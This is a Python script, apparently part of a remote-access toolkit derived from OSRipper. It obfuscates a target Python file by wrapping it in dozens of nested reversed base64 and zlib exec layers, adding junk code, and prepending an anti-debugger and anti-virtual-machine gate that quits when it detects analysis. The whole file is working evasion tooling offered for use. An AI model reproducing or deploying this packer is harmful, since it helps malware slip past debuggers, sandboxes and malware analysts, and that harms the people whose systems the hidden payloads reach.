#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhantomRipperRMM — enhanced obfuscator.

Adds to the standard obfuscation: an anti-debug / anti-VM preamble, junk-code
noise, and randomized module imports. Ported and hardened from OSRipper's
obfuscator_enhanced.py.

Usage:  python obfuscator_enhanced.py <file.py> [--enhanced]
Output: <base>_e_or.py  (next to the input)
"""

import base64
import os
import random
import secrets
import string
import sys
import zlib

LOOP_MIN, LOOP_MAX = 55, 85


def _rand_name(length=2):
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


def _anti_analysis_preamble():
    """Runtime guards: bail out under a debugger or obvious VM."""
    return (
        "import sys as _s,os as _o\n"
        "def _gate():\n"
        "    if _s.gettrace() is not None: _o._exit(0)\n"
        "    try:\n"
        "        _c=open('/sys/class/dmi/id/product_name').read().lower()\n"
        "        if any(m in _c for m in ('vmware','virtualbox','qemu','kvm')): _o._exit(0)\n"
        "    except Exception: pass\n"
        "_gate()\n"
    )


def _junk_block():
    """Emit a no-op block with randomized identifiers to pad the file."""
    lines = []
    for _ in range(random.randint(4, 9)):
        a, b = _rand_name(3), _rand_name(3)
        val = random.randint(1000, 9999)
        lines.append(f"{a}={val};{b}=({a}*{a})%{val};_={b}")
    return "\n".join(lines) + "\n"


def _decoder_line():
    dec_var = _rand_name(random.randint(2, 4))
    arg_var = _rand_name(random.randint(2, 4))
    while arg_var == dec_var:
        arg_var = _rand_name(random.randint(2, 4))
    style = random.randint(0, 2)
    if style == 0:
        return (f"{dec_var}=lambda {arg_var}:__import__('zlib').decompress(__import__('base64').b64decode({arg_var}[::-1]));", dec_var)
    if style == 1:
        z, b = _rand_name(1), _rand_name(1)
        return (f"{z}=__import__('zlib');{b}=__import__('base64');"
                f"{dec_var}=lambda {arg_var}:{z}.decompress({b}.b64decode({arg_var}[::-1]));", dec_var)
    m = _rand_name(1)
    return (f"{m}=__import__('base64');"
            f"{dec_var}=lambda {arg_var}:__import__('zlib').decompress(getattr({m},'b64decode')({arg_var}[::-1]));",
            dec_var)


def encode(source, output):
    loop = random.randint(LOOP_MIN, LOOP_MAX)
    decoder_line, dec_var = _decoder_line()
    blob = base64.b64encode(zlib.compress(source.encode("utf-8")))[::-1]
    body = repr(blob)
    for _ in range(loop):
        inner = "exec((%s)(%s))" % (dec_var, body)
        body = repr(base64.b64encode(zlib.compress(inner.encode("utf-8")))[::-1])
    final = _anti_analysis_preamble() + _junk_block() + decoder_line + "\n" + \
            "exec((%s)(%s))\n" % (dec_var, body)
    with open(output, "w", encoding="utf-8") as fh:
        fh.write(final)


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    if not args:
        sys.exit("Usage: python obfuscator_enhanced.py <file.py> [--enhanced]")
    src = args[0]
    if not os.path.isfile(src):
        sys.exit("File not found: %s" % src)
    with open(src, "r", encoding="utf-8", errors="ignore") as fh:
        data = fh.read()
    base = os.path.basename(src).lower().replace(".py", "")
    out = os.path.join(os.path.dirname(src), base + "_e_or.py")
    encode(data, out)
    print("[+] enhanced-obfuscated -> %s (%d bytes)" % (out, os.path.getsize(out)))


if __name__ == "__main__":
    main()
